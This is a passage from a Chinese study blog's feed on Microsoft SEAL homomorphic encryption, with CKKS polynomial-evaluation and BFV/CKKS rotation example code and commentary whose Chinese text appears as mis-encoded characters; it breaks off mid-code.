punctuation">;</span></code></pre><p>ç»“æœéªŒè¯:</p><p>è¾“å‡ºä¸€ä¸ªçœŸçš„ï¼Œç„¶åå°†åŠ å¯†çš„è§£å¯†è§£ç ï¼Œåšå¯¹æ¯”éªŒè¯</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093101.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093101.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093100409"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c">Plaintext plain_result<span class="token punctuation">;</span><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Decrypt and decode PI*x^3 + 0.4x + 1."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Expected result:"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> true_result<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">double</span> x <span class="token operator">=</span> input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    true_result<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3.14159265</span> <span class="token operator">*</span> x <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">0.4</span><span class="token punctuation">)</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">print_vector</span><span class="token punctuation">(</span>true_result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*    Decrypt, decode, and print the result. */</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_result<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> result<span class="token punctuation">;</span>encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Computed result ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token function">print_vector</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>              </div>            </details><h1>æºä»£ç </h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-C++" data-language="C++"><code class="language-C++">#include &quot;examples.h&quot;using namespace std;using namespace seal;void example_ckks_basics() &#123;print_example_banner(&quot;Example: CKKS Basics&quot;);&#x2F;*In this example we demonstrate evaluating a polynomial functionPI*x^3 + 0.4*x + 1on encrypted floating-point input data x for a set of 4096 equidistant pointsin the interval [0, 1]. This example demonstrates many of the main featuresof the CKKS scheme, but also the challenges in using it.We start by setting up the CKKS scheme.*&#x2F;EncryptionParameters parms(scheme_type::ckks);size_t poly_modulus_degree &#x3D; 8192;  &#x2F;&#x2F;long long unsigned intparms.set_poly_modulus_degree(poly_modulus_degree);parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 60, 40, 40, 60 &#125;));&#x2F;** æˆ‘ä»¬é€‰æ‹©åˆå§‹æ¯”ä¾‹ä¸º2^40 * this leaves us 60-40&#x3D;20 bits of precision before the decimal point, and enough (roughly    10-20 bits) of precision after the decimal point. Since our intermediate    primes are 40 bits (in fact, they are very close to 2^40), we can achieve    scale stabilization as described above.*&#x2F;double scale &#x3D; pow(2.0, 40);SEALContext context(parms);print_parameters(context);cout &lt;&lt; endl;KeyGenerator keygen(context);auto secret_key &#x3D; keygen.secret_key();PublicKey public_key;keygen.create_public_key(public_key);RelinKeys relin_keys;keygen.create_relin_keys(relin_keys);GaloisKeys galois_keys;keygen.create_galois_keys(galois_keys);Encryptor encryptor(context, public_key);Evaluator evaluator(context);Decryptor decryptor(context, secret_key);CKKSEncoder encoder(context);size_t slot_count &#x3D; encoder.slot_count();cout &lt;&lt; &quot;Number of slots: &quot; &lt;&lt; slot_count &lt;&lt; endl;vector&lt;double&gt; input;input.reserve(slot_count); &#x2F;&#x2F; ç”³è¯·ç©ºé—´double curr_point &#x3D; 0;&#x2F;&#x2F;static_cast&lt;double&gt; å°†size_t è½¬æˆæˆdouble åœ¨è¿ç®—double step_size &#x3D; 1.0 &#x2F; (static_cast&lt;double&gt;(slot_count) - 1); &#x2F;&#x2F; for (size_t i &#x3D; 0; i &lt; slot_count; i++)&#123;input.push_back(curr_point);curr_point +&#x3D; step_size;&#125;cout &lt;&lt; &quot;Input vector: &quot; &lt;&lt; endl;print_vector(input,3,7); &#x2F;&#x2F; æ‰“å°vector å‰3 é¡¹å3é¡¹,  ä¿ç•™å°æ•°ç‚¹å7ä½cout &lt;&lt; &quot;Evaluating polynomial PI*x^3 + 0.4x + 1 ...&quot; &lt;&lt; endl;Plaintext plain_coeff3, plain_coeff1, plain_coeff0;&#x2F;&#x2F; ç¼–ç encoder.encode(3.14159265, scale, plain_coeff3);encoder.encode(0.4, scale, plain_coeff1);encoder.encode(1.0, scale, plain_coeff0);Plaintext x_plain;print_line(__LINE__);cout &lt;&lt; &quot;Encode input vectors.&quot; &lt;&lt; endl;encoder.encode(input, scale, x_plain);&#x2F;&#x2F; åŠ å¯†Ciphertext x1_encrypted;encryptor.encrypt(x_plain, x1_encrypted);&#x2F;** ä¸ºäº†è®¡ç®—x^3ï¼Œæˆ‘ä»¬é¦–å…ˆè®¡ç®—x^2å¹¶é‡æ–°çº¿æ€§åŒ–ã€‚ç„¶è€Œï¼Œscaleå·²ç»ç°åœ¨å˜æˆäº†2çš„80æ¬¡æ–¹ã€‚*&#x2F;&#x2F;&#x2F; x^2Ciphertext x3_encrypted;print_line(__LINE__);cout &lt;&lt; &quot;Compute x^2 and relinearize:&quot; &lt;&lt; endl;evaluator.square(x1_encrypted, x3_encrypted); &#x2F;&#x2F; x3_encrypted &#x3D; x1_encrypted * x1_encryptedevaluator.relinearize_inplace(x3_encrypted, relin_keys);cout &lt;&lt; &quot;    + Scale of x^2 before rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;&#x2F;** ç°åœ¨é‡æ–°è°ƒèŠ‚;rescale* é™¤äº†modulus switch æ–¹æ³•å¤–ï¼Œscale å‡å°‘çš„ç³»æ•°ç­‰äºè¢«è½¬ç§»çš„è´¨æ•°ï¼ˆ40ä½è´¨æ•°ï¼‰* å› æ­¤,æ–°çš„æ¯”ä¾‹å°ºåº”è¯¥æ¥è¿‘2^40ã€‚ç„¶è€Œï¼Œscale !&#x3D; 2^40 :è¿™æ˜¯å› ä¸º40ä½ç´ æ•°åªæ˜¯æ¥è¿‘2^40ã€‚* *&#x2F;print_line(__LINE__);cout &lt;&lt; &quot;Rescale x^2.&quot; &lt;&lt; endl;evaluator.rescale_to_next_inplace(x3_encrypted); &#x2F;&#x2F; é‡æ–°è°ƒæ•´scale è§„æ¨¡cout &lt;&lt; &quot;    + Scale of x^2 after rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;&#x2F;** ç°åœ¨x3_encryptedä¸x1_encryptedå¤„äºä¸åŒçš„çº§åˆ«* è¿™é˜»æ­¢äº†æˆ‘ä»¬ x3_encrypted*x1_encrypted æ¥è®¡ç®—x^3* å› æ­¤é€šè¿‡modulus switch é“¾ å°†x1_encrypted åˆ‡æ¢åˆ°ä¸x3_encrypted åŒä¸€çº§åˆ«,* ä½†åˆéœ€è¦è®¡ç®—PI* x^3  æ‰€ä»¥ æˆ‘ä»¬å…ˆè®¡ç®— PI*x  ç„¶åè°ƒæ•´scale ä»2^80 -&gt; 2^40 * ç„¶ååœ¨è®¡ç®— Pi*x * x^2 * *&#x2F;print_line(__LINE__);&#x2F;&#x2F; PI * xcout &lt;&lt; &quot;Compute and rescale PI*x.&quot; &lt;&lt; endl;Ciphertext x1_encrypted_coeff3;evaluator.multiply_plain(x1_encrypted, plain_coeff3, x1_encrypted_coeff3);&#x2F;&#x2F; x1_encrypted_coeff3 &#x3D; x1_encrypted * plain_coeff3cout &lt;&lt; &quot;    + Scale of PI*x before rescale: &quot; &lt;&lt; log2(x1_encrypted_coeff3.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;evaluator.rescale_to_next_inplace(x1_encrypted_coeff3);cout &lt;&lt; &quot;    + Scale of PI*x after rescale: &quot; &lt;&lt; log2(x1_encrypted_coeff3.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;&#x2F;&#x2F;(PI*x)*x^2.print_line(__LINE__);cout &lt;&lt; &quot;Compute, relinearize, and rescale (PI*x)*x^2.&quot; &lt;&lt; endl;evaluator.multiply_inplace(x3_encrypted, x1_encrypted_coeff3);evaluator.relinearize_inplace(x3_encrypted, relin_keys);cout &lt;&lt; &quot;    + Scale of PI*x^3 before rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;evaluator.rescale_to_next_inplace(x3_encrypted);cout &lt;&lt; &quot;    + Scale of PI*x^3 after rescale: &quot; &lt;&lt; log2(x3_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;&#x2F;&#x2F; 0.4*xprint_line(__LINE__);cout &lt;&lt; &quot;Compute and rescale 0.4*x.&quot; &lt;&lt; endl;evaluator.multiply_plain_inplace(x1_encrypted, plain_coeff1);cout &lt;&lt; &quot;    + Scale of 0.4*x before rescale: &quot; &lt;&lt; log2(x1_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;evaluator.rescale_to_next_inplace(x1_encrypted);cout &lt;&lt; &quot;    + Scale of 0.4*x after rescale: &quot; &lt;&lt; log2(x1_encrypted.scale()) &lt;&lt; &quot; bits&quot; &lt;&lt; endl;&#x2F;** ç°åœ¨æˆ‘ä»¬å¸Œæœ›è®¡ç®—è¿™ä¸‰é¡¹çš„å’Œã€‚ç„¶è€Œ,æœ‰ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜æ˜¯:è¿™ä¸‰ä¸ªæœ¯è¯­ä½¿ç”¨çš„åŠ å¯†å‚æ•°éƒ½æ˜¯ä¸åŒæ˜¯ç”±äºæ¨¡æ•°ä»ç¼©æ”¾è½¬æ¢è€Œæ¥ã€‚åŠ å¯†çš„åŠ æ³•å’Œå‡æ³•è¦æ±‚è¾“å…¥çš„åˆ»åº¦ä¸ºç›¸åŒï¼Œå¹¶ä¸”åŠ å¯†å‚æ•°(parms_id)åŒ¹é…ã€‚å¦‚æœæœ‰ä¸åŒ¹é…æ—¶ï¼Œæ±‚å€¼å™¨å°†æŠ›å‡ºå¼‚å¸¸ã€‚*&#x2F;cout &lt;&lt; endl;print_line(__LINE__);cout &lt;&lt; &quot;Parameters used by all three terms are different.&quot; &lt;&lt; endl;cout &lt;&lt; &quot;    + Modulus chain index for x3_encrypted: &quot;&lt;&lt; context.get_context_data(x3_encrypted.parms_id())-&gt;chain_index() &lt;&lt; endl;cout &lt;&lt; &quot;    + Modulus chain index for x1_encrypted: &quot;&lt;&lt; context.get_context_data(x1_encrypted.parms_id())-&gt;chain_index() &lt;&lt; endl;cout &lt;&lt; &quot;    + Modulus chain index for plain_coeff0: &quot;&lt;&lt; context.get_context_data(plain_coeff0.parms_id())-&gt;chain_index() &lt;&lt; endl;cout &lt;&lt; endl;print_line(__LINE__);cout &lt;&lt; &quot;The exact scales of all three terms are different:&quot; &lt;&lt; endl;ios old_fmt(nullptr);old_fmt.copyfmt(cout);cout &lt;&lt; fixed &lt;&lt; setprecision(10);cout &lt;&lt; &quot;    + Exact scale in PI*x^3: &quot; &lt;&lt; x3_encrypted.scale() &lt;&lt; endl;cout &lt;&lt; &quot;    + Exact scale in  0.4*x: &quot; &lt;&lt; x1_encrypted.scale() &lt;&lt; endl;cout &lt;&lt; &quot;    + Exact scale in      1: &quot; &lt;&lt; plain_coeff0.scale() &lt;&lt; endl;cout &lt;&lt; endl;cout.copyfmt(old_fmt);print_line(__LINE__);cout &lt;&lt; &quot;Normalize scales to 2^40.&quot; &lt;&lt; endl;x3_encrypted.scale() &#x3D; pow(2.0, 40);x1_encrypted.scale() &#x3D; pow(2.0, 40);&#x2F;** æˆ‘ä»¬è¿˜æœ‰åŠ å¯†å‚æ•°ä¸åŒ¹é…çš„é—®é¢˜ã€‚è¿™æ˜¯å¾ˆå®¹æ˜“çš„é€šè¿‡ä½¿ç”¨modulus switching (no rescaling) æ¥è§£å†³*&#x2F;print_line(__LINE__);cout &lt;&lt; &quot;Normalize encryption parameters to the lowest level.&quot; &lt;&lt; endl;parms_id_type last_parms_id &#x3D; x3_encrypted.parms_id();evaluator.mod_switch_to_inplace(x1_encrypted, last_parms_id);evaluator.mod_switch_to_inplace(plain_coeff0, last_parms_id);&#x2F;*åˆ°ç°åœ¨è¿™ä¸‰ç§å¯†æ–‡ç°åœ¨éƒ½æ˜¯å…¼å®¹çš„ï¼Œå¯ä»¥è¿›è¡Œaddè¿ç®—äº†*&#x2F;print_line(__LINE__);cout &lt;&lt; &quot;Compute PI*x^3 + 0.4*x + 1.&quot; &lt;&lt; endl;Ciphertext encrypted_result;evaluator.add(x3_encrypted, x1_encrypted, encrypted_result);evaluator.add_plain_inplace(encrypted_result, plain_coeff0);Plaintext plain_result;print_line(__LINE__);cout &lt;&lt; &quot;Decrypt and decode PI*x^3 + 0.4x + 1.&quot; &lt;&lt; endl;cout &lt;&lt; &quot;    + Expected result:&quot; &lt;&lt; endl;vector&lt;double&gt; true_result;for (size_t i &#x3D; 0; i &lt; input.size(); i++)&#123;double x &#x3D; input[i];true_result.push_back((3.14159265 * x * x + 0.4) * x + 1);&#125;print_vector(true_result, 3, 7);&#x2F;*Decrypt, decode, and print the result.*&#x2F;decryptor.decrypt(encrypted_result, plain_result);vector&lt;double&gt; result;encoder.decode(plain_result, result);cout &lt;&lt; &quot;    + Computed result ...... Correct.&quot; &lt;&lt; endl;print_vector(result, 3, 7);return;&#125;</code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Microsoft SEAL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seal </tag>
            
            <tag> åŒæ€åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEALå­¦ä¹ ç¬¬äº”å¤©-Rotaion</title>
      <link href="/posts/1aba18cf/"/>
      <url>/posts/1aba18cf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaif</p></blockquote><h1>SEAL å­¦ä¹ ç¬¬äº”å¤©ï¼šrotaion</h1><p>@[toc]</p><h2 id="BFV">BFV</h2><div class="story post-story"><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*  * æ—‹è½¬è¿˜éœ€è¦å¦ä¸€ç§ç±»å‹çš„ç‰¹æ®Šé”® Galois keys */</span>GaloisKeys galois_keys<span class="token punctuation">;</span>keygen<span class="token punctuation">.</span><span class="token function">create_galois_keys</span><span class="token punctuation">(</span>galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="ä¸¤ç§åŸºæœ¬æ“ä½œ">ä¸¤ç§åŸºæœ¬æ“ä½œ</h3><table><thead><tr><th>å‡½æ•°è°ƒç”¨</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>evaluator.rotate_rows_inplace(encrypted_matrix, 3, galois_keys);</td><td>Ciphertextï¼Œstepsï¼ŒGaloisKeys</td><td>å°†çŸ©é˜µå‘å·¦(steps ä¸ºæ­£)å¾ªç¯ç§»åŠ¨3æ­¥</td></tr><tr><td>evaluator.rotate_columns_inplace(encrypted_matrix, galois_keys);</td><td>Ciphertextï¼ŒGaloisKeys</td><td>å°†çŸ©é˜µè¡Œæ—‹è½¬</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>==æ—‹è½¬ä¸æ¶ˆè€—ä»»ä½•å™ªéŸ³é¢„ç®—==</p><h4 id="æ—‹è½¬åˆ—">æ—‹è½¬åˆ—</h4><p><code>steps ä¸ºæ­£  å‘å·¦ç§»åŠ¨</code></p><p><code>steps ä¸ºè´Ÿ  å‘å³ç§»åŠ¨</code></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate rows 3 steps left."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rotate_rows_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>Plaintext plain_result<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after rotation: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>    <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093021.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093021.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093019938"></p><h4 id="æ—‹è½¬è¡Œ">æ—‹è½¬è¡Œ</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate columns."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rotate_columns_inplace</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> galois_keys<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Noise budget after rotation: "</span> <span class="token operator">&lt;&lt;</span> decryptor<span class="token punctuation">.</span><span class="token function">invariant_noise_budget</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" bits"</span>    <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted_matrix<span class="token punctuation">,</span> plain_result<span class="token punctuation">)</span><span class="token punctuation">;</span>batch_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain_result<span class="token punctuation">,</span> pod_matrix<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_matrix</span><span class="token punctuation">(</span>pod_matrix<span class="token punctuation">,</span> row_size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812093010.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812093010.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812093008588"></p></div><h2 id="CKKS">CKKS</h2><div class="story post-story"><table><thead><tr><th>å‡½æ•°è°ƒç”¨</th><th>å‚æ•°</th><th>è§£é‡Šè¯´æ˜</th></tr></thead><tbody><tr><td>evaluator.rotate_vector(encrypted, 2, galois_keys, rotated);</td><td>Ciphertextï¼Œstepsï¼ŒGaloisKeysï¼ŒCiphertext</td><td>å°†encryptedå·¦(stepsä¸ºæ­£)å¾ªç¯ç§»åŠ¨åï¼Œè¾“å‡ºåˆ°rotated</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c">Ciphertext rotated<span class="token punctuation">;</span><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate 2 steps left."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span> rotated<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>rotated<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> result<span class="token punctuation">;</span>ckks_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_vector</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_line</span><span class="token punctuation">(</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Rotate 2 steps right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>evaluator<span class="token punctuation">.</span><span class="token function">rotate_vector</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> galois_keys<span class="token punctuation">,</span> rotated<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"    + Decrypt and decode ...... Correct."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>decryptor<span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>rotated<span class="token punctuation">,</span> plain<span class="token punctuation">)</span><span class="token punctuation">;</span>ckks_encoder<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_vector</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>              </div>            </details><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210812092936.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210812092936.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210812092935587"></p><h1>æºä»£ç </h1><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"examples.h"</span></span>using namespace std<span class="token punctuation">;</span>using namespace seal<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">example_rotation_bfv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">print_example_banner</span><span class="token punctuation">(</span><span class="token string">"Example: Rotation / Rotation in BFV"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    EncryptionParameters <span class="token function">parms</span><span class="token punctuation">(</span>scheme_type<span class="token operator">::</span>bfv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> poly_modulus_degree <span class="token operator">=</span> <span class="token number">8192</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_poly_modulus_degree</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_coeff_modulus</span><span class="token punctuation">(</span>CoeffModulus<span class="token operator">::</span><span class="token function">BFVDefault</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    parms<span class="token punctuation">.</span><span class="token function">set_plain_modulus</span><span class="token punctuation">(</span>PlainModulus<span class="token operator">::</span><span class="token function">Batching</span><span class="token punctuation">(</span>poly_modulus_degree<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        SEALContext <span class="token function">context</span><span class="token punctuation">(</span>parms<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_parameters</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    KeyGenerator <span class="token function">keygen</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    SecretKey secret_key <span class="token operator">=</span> keygen<span class="token punctuation">.</span><span class="token function">secret_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PublicKey public_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_public_key</span><span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    RelinKeys relin_key<span class="token punctuation">;</span>    keygen<span class="token punctuation">.</span><span class="token function">create_relin_keys</span><span class="token punctuation">(</span>relin_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Encryptor <span class="token function">encryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    Evaluator <span class="token function">evaluator</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    Decryptor <span class="token function">decryptor</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    BatchEncoder <span class="token function">batch_encoder</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> slot_count <span class="token operator">=</span> batch_encoder<span class="token punctuation">.</span><span class="token function">slot_count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">size_t</span> row_size <span class="token operator">=</span> slot_count <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Plaintext matrix row size: "</span> <span class="token operator">&lt;&lt;</span> row_size <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token class-name">uint64_t</span><span class="token operator">></span> <span class="token function">pod_matrix</span><span class="token punctuation">(</span>slot_count<span class="token punctuation">,</span> <span class="token number">0ULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2ULL</span><span class="token punctuation">;</span>    pod_matrix<span class="token punctuation">[</span><span class="token 